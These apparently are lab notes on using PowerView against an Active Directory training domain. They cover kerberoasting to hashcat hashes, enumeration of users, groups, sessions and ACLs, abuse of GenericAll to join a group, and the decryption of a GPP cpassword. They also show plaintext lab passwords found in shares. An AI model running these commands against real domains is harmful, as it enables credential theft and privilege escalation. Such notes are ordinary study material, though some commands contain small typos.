# PowerView.ps1

---

## PoC

Decided to utilize powerview in order to kerberoast.


Created an Temp folder in C:\Users\Public and downloaded powerview.ps1 script inside it than imported it.

```
Import-Module .\PowerView.ps1
```

and ran the following command in order to check for kerberoastable users on the target domain.

```
GetDomainUser * -spn | select samaccountname
```

Extracted SPN from service mssql account user.

```
Get-DomainUser -Identity svc_mssql | Get-DomainSPNTicket -Format Hashcat
```

Enumerated DC information

```
Get-NetDomain
```

List of all users in the domain.

```
Get-NetUser
```

Short version of it:

```
Get-NetUser | select cn
```

Checking when last password change and last logon

```
Get-NetUser | select cn,pwdlastset,lastlogon
```

Enumerating Groups

```
Get-NetGroup | select cn
```

Checking Specific group

```
Get-NetGroup "Sales Department" | select member
```

Spraying the environment to find possible local administrative access on computers under the current user

```
Find-LocalAdminAccess
```

Check which user is logged on

```
Get-NetSession -ComputerName files04 -Verbose
Get-NetSession -ComputerName web04 -Verbose
```



```
Get-NetSession -ComputerName client74
CName        : \\192.168.50.75
UserName     : stephanie
Time         : 8
IdleTime     : 0
ComputerName : client74
```

Enumerating Permissions for registry key.

```
PS C:\Tools> Get-Acl -Path HKLM:SYSTEM\CurrentControlSet\Services\LanmanServer\DefaultSecurity\ | fl

Path   : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\LanmanServer\DefaultSecurity\
Owner  : NT AUTHORITY\SYSTEM
Group  : NT AUTHORITY\SYSTEM
Access : BUILTIN\Users Allow  ReadKey
         BUILTIN\Administrators Allow  FullControl
         NT AUTHORITY\SYSTEM Allow  FullControl
         CREATOR OWNER Allow  FullControl
         APPLICATION PACKAGE AUTHORITY\ALL APPLICATION PACKAGES Allow  ReadKey
         S-1-15-3-1024-1065365936-1281604716-3511738428-1654721687-432734479-3232135806-4053264122-3456934681 Allow  ReadKey
```

Enumerating devices and there os 

```
Get-NetComputer | select dnshostname,operatingsystem,operatingsystemversion
```

## Enumerating through SPNs | PowerView

Enumerating SPNs in the domain.

```
setspn -L iis_service
```

With PowerView:

```
Get-NetUser -SPN | select samaccountname,serviceprincipalname
```

Resolving domain ip

```
PS C:\Tools\> nslookup.exe web04.corp.com
Server:  UnKnown
Address:  192.168.50.70

Name:    web04.corp.com
Address:  192.168.50.72
```

Checking Permissions of our user (ACE's)

```
Get-ObjectAcl -Identity stephanie
```

Analyzing SID

```
Convert-SidToName S-1-5-21-1987370270-658905905-1781884369-1104
CORP\stephanie
```

Inspecting 1. group which users have permissions on it.

```
Get-ObjectAcl -Identity "Management Department" | ? {$_.ActiveDirectoryRights -eq "GenericAll"} | select SecurityIdentifier,ActiveDirectoryRights
SecurityIdentifier                            ActiveDirectoryRights
------------------                            ---------------------
S-1-5-21-1987370270-658905905-1781884369-512             GenericAll
S-1-5-21-1987370270-658905905-1781884369-1104            GenericAll
S-1-5-32-548                                             GenericAll
S-1-5-18                                                 GenericAll
S-1-5-21-1987370270-658905905-1781884369-519             GenericAll
```


Converting all the SID's to users.

```
"S-1-5-21-1987370270-658905905-1781884369-512","S-1-5-21-1987370270-658905905-1781884369-1104","S-1-5-32-548","S-1-5-18","S-1-5-21-1987370270-658905905-1781884369-519" | Convert-SidToName
CORP\Domain Admins
CORP\stephanie
BUILTIN\Account Operators
Local System
CORP\Enterprise Admins
```

The first SID belongs to the Domain Admins group and the GenericAll permission comes as no surprise since Domain Admins have the highest privilege possible in the domain. What's interesting, however, is to find stephanie in this list. Typically, a regular domain user should not have GenericAll permissions on other objects in AD, so this may be a misconfiguration.

This finding is significant and indicates that stephanie is a powerful account.

When we enumerated the Management Group, we discovered that jen was its only member. As an experiment to show the power of misconfigured object permissions, let's try to use our permissions as stephanie to add ourselves to this group with net.exe.

```
net group "Management Department" stephanie /add /domain
```

## Enumerating Domain Shares | PowerView

```
Find-DomainShare
Name           Type Remark                 ComputerName
----           ---- ------                 ------------
ADMIN$   2147483648 Remote Admin           DC1.corp.com
C$       2147483648 Default share          DC1.corp.com
IPC$     2147483651 Remote IPC             DC1.corp.com
NETLOGON          0 Logon server share     DC1.corp.com
SYSVOL            0 Logon server share     DC1.corp.com
ADMIN$   2147483648 Remote Admin           web04.corp.com
backup            0                        web04.corp.com
C$       2147483648 Default share          web04.corp.com
IPC$     2147483651 Remote IPC             web04.corp.com
ADMIN$   2147483648 Remote Admin           FILES04.corp.com
C                 0                        FILES04.corp.com
C$       2147483648 Default share          FILES04.corp.com
docshare          0 Documentation purposes FILES04.corp.com
IPC$     2147483651 Remote IPC             FILES04.corp.com
Tools             0                        FILES04.corp.com
Users             0                        FILES04.corp.com
Windows           0                        FILES04.corp.com
ADMIN$   2147483648 Remote Admin           client74.corp.com
C$       2147483648 Default share          client74.corp.com
IPC$     2147483651 Remote IPC             client74.corp.com
ADMIN$   2147483648 Remote Admin           client75.corp.com
C$       2147483648 Default share          client75.corp.com
IPC$     2147483651 Remote IPC             client75.corp.com
sharing           0                        client75.corp.com
```

In this instance, we'll first focus on SYSVOL, as it may include files and folders that reside on the domain controller itself.

```
PS C:\Tools> ls \\dc1.corp.com\sysvol\corp.com\

    Directory: \\dc1.corp.com\sysvol\corp.com

Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
d-----         9/21/2022   1:11 AM                Policies
d-----          9/2/2022   4:08 PM                scripts
```
```
ls \\dc1.corp.com\sysvol\corp.com\Policies\
 Directory: \\dc1.corp.com\sysvol\corp.com\Policies

Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
d-----         9/21/2022   1:13 AM                oldpolicy
d-----          9/2/2022   4:08 PM                {31B2F340-016D-11D2-945F-00C04FB984F9}
d-----          9/2/2022   4:08 PM                {6AC1786C-016F-11D2-945F-00C04fB984F9}
```

All the folders are potentially interesting, but we'll explore oldpolicy first. 


```
cat \\dc1.corp.com\sysvol\corp.com\Policies\oldpolicy\old-policy-backup.xml
PS C:\Tools> cat \\dc1.corp.com\sysvol\corp.com\Policies\oldpolicy\old-policy-backup.xml
<?xml version="1.0" encoding="utf-8"?>
<Groups   clsid="{3125E937-EB16-4b4c-9934-544FC6D24D26}">
  <User   clsid="{DF5F1855-51E5-4d24-8B1A-D9BDE98BA1D1}"
          name="Administrator (built-in)"
          image="2"
          changed="2012-05-03 11:45:20"
          uid="{253F4D90-150A-4EFB-BCC8-6E894A9105F7}">
    <Properties
          action="U"
          newName=""
          fullName="admin"
          description="Change local admin"
          cpassword="+bsY0V3d4/KgX3VJdO/vyepPfAN1zMFTiQDApgR92JE"
          changeLogon="0"
          noChange="0"
          neverExpires="0"
          acctDisabled="0"
          userName="Administrator (built-in)"
          expires="2016-02-10" />
  </User>
</Groups>
```

We found an encrypted password which can be encrypted with the following keys:

```
he 32-byte AES key is as follows:

     4e 99 06 e8  fc b6 6c c9  fa f4 93 10  62 0f fe e8
     f4 96 e8 06  cc 05 79 90  20 9b 09 a4  33 b6 6c 1b
```

PoC:

```
kali@kali:~$ gpp-decrypt "+bsY0V3d4/KgX3VJdO/vyepPfAN1zMFTiQDApgR92JE"
P@$$w0rd
```


```
PS C:\Tools> ls \\FILES04\docshare

    Directory: \\FILES04\docshare

Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
d-----         9/21/2022   2:02 AM                docs
```




```
PS C:\Tools> ls \\FILES04\docshare\docs\do-not-share

    Directory: \\FILES04\docshare\docs\do-not-share

Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a----         9/21/2022   2:02 AM           1142 start-email.txt
```




```
PS C:\Tools> cat \\FILES04\docshare\docs\do-not-share\start-email.txt
Hi Jeff,

We are excited to have you on the team here in Corp. As Pete mentioned, we have been without a system administrator
since Dennis left, and we are very happy to have you on board.

Pete mentioned that you had some issues logging in to your Corp account, so I'm sending this email to you on your personal address.

The username I'm sure you already know, but here you have the brand new auto generated password as well: HenchmanPutridBonbon11

As you may be aware, we are taking security more seriously now after the previous breach, so please change the password at first login.

Best Regards
Stephanie
```




```

```



```

```



```

```
